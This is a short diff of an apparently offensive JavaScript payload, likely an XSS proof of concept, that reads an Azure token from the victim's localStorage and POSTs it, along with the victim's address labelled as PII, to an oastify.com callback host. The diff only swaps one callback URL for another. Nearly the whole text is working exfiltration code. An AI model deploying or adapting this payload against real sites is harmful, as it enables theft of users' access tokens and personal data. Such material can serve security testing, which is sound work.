@@ -1,6 +1,6 @@
 var victimAzureToken=localStorage.getItem('azure_token');
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://9bl166nouqlqqbye0zvg284lkcq3et2i.oastify.com", true);
+xhr.open("POST", "https://mb16662y9t0qvr2su0lcrp108rei28qx.oastify.com", true);
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 xhr.onreadystatechange = function() {
@@ -28,7 +28,7 @@ xhr.onreadystatechange = function() {
     //get and send PII
     var reqBody = victimAddress;
     var xhrr = new XMLHttpRequest();
-    xhrr.open("POST", "https://9bl166nouqlqqbye0zvg284lkcq3et2i.oastify.com", true);
+    xhrr.open("POST", "https://mb16662y9t0qvr2su0lcrp108rei28qx.oastify.com", true);
     xhrr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     var requestBody = reqBody;
     xhrr.send(requestBody);
